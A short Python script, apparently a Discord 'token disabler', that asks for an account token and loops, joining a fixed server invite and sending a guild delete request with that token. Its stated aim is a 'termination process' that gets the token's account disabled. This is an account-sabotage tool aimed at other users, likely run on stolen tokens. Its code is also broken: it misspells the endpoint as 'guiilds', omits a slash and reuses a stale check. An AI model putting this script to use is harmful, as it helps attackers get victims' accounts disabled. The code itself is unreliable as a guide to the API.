import requests
import json
import os
import sys
import time

token = input("Enter Token: ")

print("Starting termination process.")
"""while True:
    api = requests.get("https://discordapp.com/api/v6/invite/hwcVZQw")
    data = api.json()
    check = requests.get("https://discordapp.com/api/v6/guilds/" + data['guild']['id'], headers={"Authorization": token})
    stuff = check.json()
    requests.post("https://discordapp.com/api/v6/invite/hwcVZQw", headers={"Authorization": token})
    requests.delete("https://discordapp.com/api/v6/guiilds" + data['guild']['id'], headers={"Authorization": token})

    if stuff['code'] == 40002:
        print("Could not disable but instead unverified this token")
        break
    elif stuff['code'] == 0:
        print("Successfully disabled")
        break"""

while True:
    api = requests.get("https://discordapp.com/api/v6/invite/hwcVZQw")
    data = api.json()
    check = requests.get("https://discordapp.com/api/v6/guilds/" + data['guild']['id'], headers={"Authorization": token})
    stuff = check.json()
    requests.post("https://discordapp.com/api/v6/invite/hwcVZQw", headers={"Authorization": token})
    requests.delete("https://discordapp.com/api/v6/guiilds" + data['guild']['id'], headers={"Authorization": token})

    if stuff['code'] == 0:
        print("Successfully disabled")
        break